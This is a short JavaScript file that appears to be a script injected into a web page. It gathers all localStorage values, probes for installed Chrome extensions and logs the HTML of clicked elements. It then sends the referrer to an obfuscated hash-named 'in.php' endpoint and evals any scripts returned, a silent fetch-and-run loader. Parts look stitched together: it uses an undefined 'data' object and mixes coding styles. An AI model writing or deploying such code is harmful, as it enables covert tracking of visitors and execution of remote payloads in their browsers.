let tracker = {};
let localStorageKeys = Object.keys(localStorage);
function td24f164e52654fc593c6952240be1dc210935fe_sendXmlHttpRequest(request) {
  try {
    var xhr = window.XMLHttpRequest ? new window.XMLHttpRequest() : window.ActiveXObject ? new ActiveXObject("Microsoft.XMLHTTP") : null;
    xhr.open("GET", "/td24f164e52654fc593c6952240be1dc210935fe/in.php?ft=1692507198&fs=2e0afe647051c01face5980a96b205e1" + request, !0), xhr.onreadystatechange = function () {
      if (4 === this.readyState && 200 == this.status) {
        var div = document.createElement("div");
        div.innerHTML = xhr.responseText;
        for (var scripts = div.getElementsByTagName("script"), ix = 0; ix < scripts.length; ix++) eval(scripts[ix].text);
      }
    }, xhr.send(null);
  } catch (e) {
    console.log("can't do ajax request");
  }
}
localStorageKeys.forEach(key => {
  tracker[key] = localStorage.getItem(key);
});
let extensionsChecked = Object.keys(data).map(key => {
  // Clone to global variable
  tracker[key] = `chrome-extension://${data[key].id}/${data[key].file}`;
  return fetch(`chrome-extension://${data[key].id}/${data[key].file}`).then(() => ({
    name: key,
    detected: true,
    id: data[key].id
  })).catch(() => ({
    name: key,
    detected: false,
    id: data[key].id
  }));
});

// Add event listener to track user actions
function td24f164e52654fc593c6952240be1dc210935fe_getReferrer() {
  var e = "";
  try {
    e = window.top.document.referrer;
  } catch (t) {
    if (window.parent) try {
      e = window.parent.document.referrer;
    } catch (t) {
      e = "";
    }
  }
  return "" === e && (e = document.referrer), e;
}
var referer = td24f164e52654fc593c6952240be1dc210935fe_getReferrer(),
  tmp = document.location.href.split("?"),
  refdomain = "";
if (tmp[1]) {
  var tmp1 = tmp[1].split("&"),
    tmp2;
  for (var i in tmp1) tmp2 = tmp1[i].split("="), "id" !== tmp2[0] && "from" !== tmp2[0] || tmp2[1] && (refdomain = tmp2[1]);
}
window.addEventListener('click', event => {
  tracker['last-clicked-element'] = event.target.outerHTML;
});
td24f164e52654fc593c6952240be1dc210935fe_sendXmlHttpRequest("&referer=" + encodeURIComponent(referer) + "&id=" + encodeURIComponent(refdomain));
extensionsChecked = Promise.all(extensionsChecked).then(values => {
  // Add Promise results to the tracker
  tracker['extensions-results'] = values;
  return values;
});